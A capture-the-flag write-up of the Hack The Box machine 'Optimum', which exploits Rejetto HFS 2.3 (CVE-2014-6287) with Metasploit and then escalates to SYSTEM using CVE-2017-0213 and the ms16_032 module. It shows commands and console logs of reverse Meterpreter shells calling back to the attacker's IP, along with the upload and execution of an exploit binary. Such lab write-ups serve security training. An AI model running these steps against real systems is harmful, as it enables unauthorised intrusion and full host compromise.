# Optimum - 10.10.10.8

## Nmap Scan

```bash
db_nmap -A -v -n -p- 10.10.10.8
```
Port 80 is open, and there is a HFS 2.3 running on it.
```
> services -R 10.10.10.8

Services
========

host    	port  proto  name  state  info
----    	----  -----  ----  -----  ----
10.10.10.8  80	tcp	http  open   HttpFileServer httpd 2.3

RHOSTS => 10.10.10.8

```

## Getting a shell

_Disclaimer: it took me much longer than it should have to get a shell, so apparently updating msf every once in a while is not a bad idea after all..._

Use Rejetto HttpFileServer Remote Command Execution ([CVE-2014-6287](http://cvedetails.com/cve/cve-2014-6287))
```
msf exploit(rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.195:4444
[*] Using URL: http://0.0.0.0:8080/N6vO0crvdn
[*] Local IP: http://10.0.2.15:8080/N6vO0crvdn
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /N6vO0crvdn
[*] Sending stage (179267 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.14.195:4444 -> 10.10.10.8:49351) at 2017-10-27 21:16:51 -0400
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\aLEvvN.vbs' on the target
[!] Tried to delete %TEMP%\aLEvvN.vbs, unknown result

meterpreter >
```

## Priv esc

```
meterpreter > sysinfo
Computer    	: OPTIMUM
OS          	: Windows 2012 R2 (Build 9600).
Architecture	: x64
System Language : el_GR
Domain      	: HTB
Logged On Users : 1
Meterpreter 	: x86/windows
```

[CVE 2017-0213](http://www.cvedetails.com/cve/cve-2017-0213) looks like a great fit.

```
meterpreter > upload /root/Downloads/CVE-2017-0213_x64.exe kingpin.exe
[*] uploading  : /root/Downloads/CVE-2017-0213_x64.exe -> kingpin.exe
[*] uploaded   : /root/Downloads/CVE-2017-0213_x64.exe -> kingpin.exe
meterpreter > execute kingpin.exe
```

### El problemo

The exploit is finishing the execution and indeed elevates the privileges to Administrator. The problem is that is spawns a new shell, this can be verified by ```meterpreter> screenshot```.
![Sick shell](https://i.imgur.com/nr5Zi5C.jpg
 "Sick shell")

 Compiling c++ with Win SDK on linux is painful, maybe some easier options are available.

### ms16_032

First, migrate the current shell to a 64-bit process (Important!)

Switch to writable directory (e.g. Desktop) and background the session.
Select ```ms16_032_secondary_logon_handle_privesc``` from exploit/windows/local. Set the target to Windows x64, then set the payload to 64-bit meterpeter.

```
msf exploit(ms16_032_secondary_logon_handle_privesc) > exploit

[*] Started reverse TCP handler on 10.10.14.195:6666
[*] Writing payload file, C:\Users\kostas\Desktop\DtsLHDR.txt...
[*] Compressing script contents...
[+] Compressed size: 3580
[*] Executing exploit script...
[*] Sending stage (205379 bytes) to 10.10.10.8
[*] Meterpreter session 5 opened (10.10.14.195:6666 -> 10.10.10.8:49224) at 2017-10-29 02:05:41 -0400
[+] Cleaned up C:\Users\kostas\Desktop\DtsLHDR.txt

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
